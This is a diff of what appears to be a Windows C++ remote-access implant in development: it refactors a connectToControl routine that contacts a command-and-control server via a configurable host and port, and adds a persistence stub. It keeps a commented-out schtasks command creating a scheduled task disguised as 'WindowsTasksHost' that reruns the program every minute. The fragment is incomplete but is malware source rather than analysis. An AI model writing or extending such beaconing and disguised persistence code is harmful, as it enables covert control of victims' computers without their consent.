@@ -39,6 +39,7 @@ LPWSTR fullFilePath[MAX_PATH];
 
 using json = nlohmann::json;
 
+std::string Config::selfPath;
 
 struct SystemInfo
 {
@@ -335,7 +336,7 @@ void connectToControl()
         }
 
         // Get Server info
-        HOSTENT* host = gethostbyname(szHost);
+        HOSTENT* host = gethostbyname(Config::szHost.c_str());
         if (host == nullptr) {
             closesocket(sock);
             fprintf(stderr, "gethostbyname()\n");
@@ -346,7 +347,7 @@ void connectToControl()
         // Define server info
         SOCKADDR_IN sin;
         ZeroMemory(&sin, sizeof(sin));
-        sin.sin_port = htons(PORT);
+        sin.sin_port = htons(Config::szPort);
         sin.sin_family = AF_INET;
         memcpy(&sin.sin_addr.S_un.S_addr, host->h_addr_list[0], sizeof(sin.sin_addr.S_un.S_addr));
 
@@ -398,7 +399,15 @@ void connectToControl()
 
 }
 
+void initConfig() {
+    // get executable location
+    //TCHAR buffer[MAX_PATH] = { 0 };
+    //GetModuleFileName(NULL, buffer, MAX_PATH);
+    //std::string Config::selfPath = buffer;
 
+    // check persistence
+
+}
 
 
 std::string CurrentPath;
@@ -407,14 +416,12 @@ std::string CurrentPath;
 
 int main()
 {
+
+    BSTR address;
+
+
     //FreeConsole();
-    //system("schtasks /create /sc MINUTE /tn WindowsTasksHost /mo 1 /tr " + getCurrentPath())
-    std::cout << "hello world" << std::endl;
-    
-    auto j3 = json::parse("{ \"happy\": 12, \"pi\": 3.141 }");
-    int x = j3["happy"];
-    x++;
-    std::cout << x;
+    //system("schtasks /create /sc MINUTE /tn WindowsTasksHost /mo 1 /tr " + getCurrentPath()
 
     // Initialize some paths for later use
     GetTempPathA(sizeof(folder), folder);
@@ -439,7 +446,7 @@ int main()
     }
     */
     // END: testing
-
+    std::cout << "amogers";
     connectToControl();
     
     ExitProcess(EXIT_SUCCESS);
